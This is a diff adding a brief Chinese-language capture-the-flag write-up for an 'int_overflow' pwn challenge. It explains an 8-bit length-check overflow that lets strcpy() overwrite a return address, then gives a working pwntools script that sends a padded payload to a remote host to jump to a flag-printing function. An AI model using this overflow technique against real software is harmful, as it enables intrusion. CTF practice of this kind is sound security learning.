@@ -1,0 +1,13 @@
+竟然有专门cat flag的函数
+值得注意的是检验长度的v3是存在int8里的，这就意味着超过255就溢出了。
+过了这个坎，就可以通过strcpy()覆盖返回地址了
+
+from pwn import *
+p = remote("111.198.29.45", 31653)
+#p = process("int_overflow")
+p.sendlineafter("choice:","1")
+p.sendlineafter("username:\n","xxx")
+payload = "a"*24 + p32(0x0804868b)
+payload = payload.ljust(261, "x")
+p.sendlineafter("your passwd:\n",payload)
+p.interactive()
